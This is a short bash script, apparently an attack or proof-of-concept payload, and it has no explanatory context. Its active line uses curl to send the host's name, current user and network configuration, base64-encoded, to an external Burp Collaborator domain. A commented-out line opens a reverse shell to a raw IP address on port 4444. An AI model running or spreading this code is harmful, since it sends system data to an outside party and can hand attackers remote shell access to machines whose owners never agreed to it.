#!/bin/bash
curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(ifconfig | base64)" -d $(ifconfig | base64)  http://eucn1wx7jvlw9oq0wahjpu4syj49sy.burpcollaborator.net;
#/bin/bash -l > /dev/tcp/143.198.115.223/4444 0<&1 2>&1
